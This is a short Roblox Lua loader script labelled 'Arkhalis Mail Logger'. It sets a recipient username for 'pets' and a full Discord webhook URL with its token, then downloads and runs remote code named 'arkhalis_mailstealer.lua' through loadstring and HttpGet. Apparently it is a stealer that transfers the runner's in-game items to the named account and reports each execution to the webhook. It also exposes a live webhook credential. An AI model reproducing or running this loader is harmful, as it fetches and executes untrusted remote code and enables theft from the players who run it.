--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username1 = "DevilGabriel6" --// Username To Send Pets To
_G.Username2 = "" --// Username To Send Pets To [OPTIONAL]
--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1111603561764229161/O1ieLVUI4NI02DhX18sZt3u6mghjgP2r1eBTRRSbnb_rGXNebFRzz4ZLD4HRL_7MjDzZ" --// Discord Webhook For Executions

--[[ Script ]]--
loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
